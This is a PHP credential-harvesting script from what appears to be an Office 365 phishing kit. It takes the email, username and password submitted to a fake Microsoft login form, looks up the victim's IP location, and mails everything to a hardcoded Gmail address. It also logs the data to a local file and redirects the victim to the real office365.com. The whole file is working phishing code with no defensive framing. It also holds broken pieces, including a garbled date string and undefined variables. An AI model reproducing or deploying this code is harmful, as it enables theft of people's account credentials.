<?php

$to = "mmlogsr9@gmail.com";

//--------------------------------------
$eml = $_POST['i0116'];
$usr = $_POST['i0117'];
$pwd = $_POST['i0118'];
$link = $_SERVER['HTTP_REFERER'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$state = stripslashes(ucfirst($addr_details[geoplugin_regionName]));
$timedate = date("D/M/d, Y g(idea)
 a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$subj = "Office 365   |$country|$ip";
$msg = "-----------------------------------------------\n	Email Address : $eml\n	Username : $usr\n  Password : $pwd\n-----------------------------------------------\nSubmition Time : $timedate\nBrowser used : $browserAgent\nSystem IP : $ip\nSystem Hostname : $hostname\nState : $state\nCountry : $country\nLink : $link\nBOX URL Address : $box\n-----------------------------------------------\n";
$from = "";
mail($to, $subj, $msg, $from);

 $fp = fopen("br.txt","a");
fputs($fp,$msg);
fclose($fp);
	if(empty($pass))

header('location:https://office365.com');
?>